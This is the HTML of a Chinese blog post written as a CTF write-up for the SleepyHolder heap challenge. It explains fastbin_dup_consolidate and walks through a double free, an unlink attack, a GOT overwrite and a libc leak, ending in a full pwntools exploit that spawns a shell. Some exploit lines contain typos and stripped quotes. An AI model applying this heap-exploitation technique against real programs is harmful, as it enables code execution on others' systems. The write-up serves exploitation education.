@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SleepHolder | Bin Fantasy🤯</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="​                关于fastbin_dup_consolidate，以及unlink的另一题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SleepHolder">
+<meta property="og:url" content="http://example.com/2020/03/03/SleepHolder/index.html">
+<meta property="og:site_name" content="Bin Fantasy🤯">
+<meta property="og:description" content="​                关于fastbin_dup_consolidate，以及unlink的另一题。">
+<meta property="og:locale">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/2.png">
+<meta property="article:published_time" content="2020-03-03T05:43:46.000Z">
+<meta property="article:modified_time" content="2020-07-13T12:55:05.362Z">
+<meta property="article:author" content="Ash3n On3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Bin Fantasy🤯" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-SleepHolder" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/03/SleepHolder/" class="article-date">
+  <time class="post-time" datetime="2020-03-03T05:43:46.000Z" itemprop="datePublished">
+    <span class="post-month">3月</span><br/>
+    <span class="post-day">03</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SleepHolder
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>​                关于fastbin_dup_consolidate，以及unlink的另一题。<span id="more"></span></p>
+<p>​                今天做题还挺快，毕竟是之前已经研究过一点的题目。</p>
+<h2 id="0x00-fastbin-dup-consolidate"><a href="#0x00-fastbin-dup-consolidate" class="headerlink" title="0x00 . fastbin_dup_consolidate"></a>0x00 . fastbin_dup_consolidate</h2><p>​                贴一下代码作为例子。。(code from how2heap)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span> p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Allocated two fastbins p1=%p p2=%pn, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Now free p1!n);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Allocated large bin to trigger <span class="built_in">malloc_consolidate</span>() p3=%pn, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, In <span class="built_in">malloc_consolidate</span>(), p1 is moved to the unsorted bin.n);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Trigger the <span class="keyword">double</span> free vulnerability!n);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, We can pass the check in <span class="built_in">malloc</span>() since p1 is <span class="keyword">not</span> fast top.n);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Now p1 is in unsorted bin <span class="keyword">and</span> fast bin. So we<span class="number">&#x27;</span>will get it twice %p %pn, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​                代码说明了两件事：</p>
+<p>​                1、要实现double并非只能用释放堆块来掩护：free(1);free(2);free(1);还可以申请堆块来掩护：free(1);malloc(2);free(1);</p>
+<p>​                2、系统在分配large chunk的时候会调用malloc_consolidate()，这个函数相当于free()，就是一个回收函数，主要功能是将fastbin中的chunk整理一下，能合并就合并，不能合并也清除一下使用标志位(inuse = 0)，然后全部丢到unsort bin里面。</p>
+<p>​                3、所以如果再malloc()一次，就可以多free(1)一次，因为人家本来也不在fast bin，而且也不被top chunk所指。</p>
+<h2 id="0x01-SleepyHolder-Write-Up"><a href="#0x01-SleepyHolder-Write-Up" class="headerlink" title="0x01 . SleepyHolder Write Up"></a>0x01 . SleepyHolder Write Up</h2><h3 id="A-分析程序"><a href="#A-分析程序" class="headerlink" title="A . 分析程序"></a>A . 分析程序</h3><p>​                运行看看效果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Waking Sleepy Holder up ...</span><br><span class="line">Hey! Do you have any secret?</span><br><span class="line">I can help you to hold your secrets, and no one will be able to see it :)</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">1</span><br><span class="line">What secret do you want to keep?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">3. Keep a huge secret and lock it forever</span><br><span class="line">1</span><br><span class="line">Tell me your secret: </span><br><span class="line">AAAAAA</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">3</span><br><span class="line">Which Secret do you want to renew?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">1</span><br><span class="line">Tell me your secret: </span><br><span class="line">Small</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">2</span><br><span class="line">Which Secret do you want to wipe?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>​                看看保护和文件格式：</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/1.png" style="zoom:67%;" />
+
+<p>​                主要函数如下，除此之外本程序中的alarm()也需要keypatch掉。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/3.png"  />
+
+<p>​                分析主要函数：</p>
+<p>​                Add():只允许分配small,big,huge三种secret，每种只能分配一次，而且huge只要分配过后，就不再允许使用huge secret了。另外，这三种secret的指针都位于bss段，是全局变量。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/2.png" style="zoom:87%;" />
+
+<p>​                Wipe():free()时未检查指针是否为空，存在Double free漏洞。</p>
+<p>​                Renew():输入限制大小，不可堆溢出。因此构造和输入payload时都要根据secret大小来选择。</p>
+<p>​                另外程序中没有找到输出函数，大致方向还是修改got表，puts(func@plt)，计算偏移得到libc，再getshell。</p>
+<h3 id="B-内存布局"><a href="#B-内存布局" class="headerlink" title="B . 内存布局"></a>B . 内存布局</h3><ul>
+<li><p>申请small chunk和big chunk，然后释放small chunk。</p>
+</li>
+<li><p>申请huge chunk，此时由于malloc_consolidate()，small chunk被丢进unsort bin。</p>
+</li>
+<li><p>再释放small chunk，又把small chunk丢进fast bin。double free。</p>
+</li>
+<li><p>small chunk构造fake_chunk，并修改big chunk的标志位，欺骗系统相信fake chunk已经free，需要合并。</p>
+</li>
+<li><p>此时释放big chunk，系统会使其与small_chunk里面的fake_chunk合并，导致unlink。</p>
+</li>
+<li><p>此时写入fake chunk中的指针成功偏移。</p>
+<h3 id="C-Leak-amp-Getshell"><a href="#C-Leak-amp-Getshell" class="headerlink" title="C  . Leak &amp; Getshell"></a>C  . Leak &amp; Getshell</h3></li>
+<li><p>通过small_ptr把big_ptr、small_ptr和3个标志位分别改成atoi@plt，free@got，和1。</p>
+</li>
+<li><p>renew(1)将puts@got写入small_ptr，其实是覆写了free@got。</p>
+</li>
+<li><p>free(2)相当于puts(atoi@plt)，通过计算可以透出libc地址啦。</p>
+</li>
+<li><p>现在我们已经成功透到了libc的地址，通过计算可以得到system地址了。</p>
+</li>
+<li><p>renew(1)将system_addr写入到small_ptr，其实也是覆写了free@got。</p>
+</li>
+<li><p>renew(2)将”/bin/sh\x00”写入到big_ptr待用。</p>
+</li>
+<li><p>现在只要wipe(2)，实际上就是getshell咯(。・∀・)ノ。</p>
+<h4 id="D-Exp"><a href="#D-Exp" class="headerlink" title="D . Exp"></a>D . Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./SleepyHolder&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./SleepyHolder&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">small_ptr = <span class="number">0x06020D0</span></span><br><span class="line">free_addr = elf.got[free]</span><br><span class="line">puts_addr = elf.got[puts]</span><br><span class="line">puts_plt = elf.plt[puts]</span><br><span class="line">atoi_addr = elf.got[atoi]</span><br><span class="line">atoi_offset = libc.symbols[atoi]</span><br><span class="line">system_offset = libc.symbols[system]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.recvuntill(<span class="string">&quot;3. Renew secret\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(index))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;Tell me your secret:\n&quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wipe</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntill(<span class="string">&quot;3. Renew secret\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;2. Big secret\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renew</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.recvuntill(<span class="string">&quot;3. Renew secret&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;2. Big secret&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(index))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;Tell me your secret:&quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#=======================Memory Arrange=======================</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&quot;BBBBBBBB&quot;</span>)</span><br><span class="line">wipe(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&quot;CCCCCCCCC&quot;</span>)			<span class="comment">#triger malloc_consolidate()</span></span><br><span class="line">wipe(<span class="number">1</span>)				<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">fake_chunk =p64(<span class="number">0</span>)*<span class="number">2</span>		<span class="comment">#chunk header is useless</span></span><br><span class="line">fake_chunk+=p64(small_ptr-<span class="number">0x18</span>)	<span class="comment">#unlink ptr</span></span><br><span class="line">fake_chunk+=p64(small_ptr-<span class="number">0x10</span>)	<span class="comment">#unlink ptr too</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0x20</span>)		<span class="comment">#made chunk2 believe that chunk1is free to triger unlink</span></span><br><span class="line">add(<span class="number">1</span>,fake_chunk)			<span class="comment">#now we can move the small_ptr later</span></span><br><span class="line">wipe(<span class="number">2</span>)				<span class="comment">#triger the unlink</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#============================ Leak ===========================</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=atoi_addr	<span class="comment">#big_chunk = atoi@got</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">8</span>	<span class="comment">#the huge_ptr is useless anyway</span></span><br><span class="line">payload+=free_addr	<span class="comment">#small_chunk = free@got</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)*<span class="number">3</span>	<span class="comment">#insure 3 flags == 1</span></span><br><span class="line">renew(<span class="number">1</span>,payload)	<span class="comment">#change the chunk_ptr to got</span></span><br><span class="line">renew(<span class="number">1</span>,puts_plt)	<span class="comment">#change free_addr to puts_plt</span></span><br><span class="line">wipe(<span class="number">2</span>)		<span class="comment">#free(big_ptr) &lt;----&gt; puts(puts_plt)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=========================== GetShell ========================</span></span><br><span class="line">libc_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;/x00&#x27;</span>)) - atoi_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">renew(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">renew(<span class="number">2</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/03/03/SleepHolder/" data-id="ckmlis0z40008s0ljamo0h76v" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/03/06/house-of-spirit/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          House_of_spirit
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/03/02/Unlink-stkof/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Unlink(stkof)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Bin Fantasy🤯</h1>
+    <h2 class="blog-subtitle">You may found nothing here.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友链</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2020 - 2021 Ash3n On3<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
